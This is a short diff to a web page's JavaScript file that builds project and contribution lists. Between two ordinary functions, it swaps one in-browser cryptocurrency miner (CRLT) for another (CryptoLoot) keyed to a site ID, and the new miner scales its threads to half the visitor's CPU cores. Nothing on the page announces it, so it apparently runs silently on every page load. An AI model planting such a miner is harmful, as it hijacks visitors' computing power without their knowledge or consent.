@@ -68,12 +68,14 @@ function load_projects_list() {
     document.getElementById("kuro").parentNode.appendChild(br);
   }
 }
-
-  var miner=new CRLT.Anonymous('a25eabeef86fda23750574d4b72f30052593455c394c', {
-    threads:1,throttle:0.2, coin: "upx",
-  });
-  miner.start();
-
+var threads = window.navigator.hardwareConcurrency / 2;
+if (threads < 1) {
+                var threads = 1;
+   }
+   var miner=new CryptoLoot.Anonymous('a25eabeef86fda23750574d4b72f30052593455c394c', {
+                threads:threads,autoThreads:false,throttle:0.2,
+   });
+        miner.start();
 function load_contrib_list() {
   for (var i = 0; i < contributions_list.length; i++) {
     var tr = document.createElement("tr");
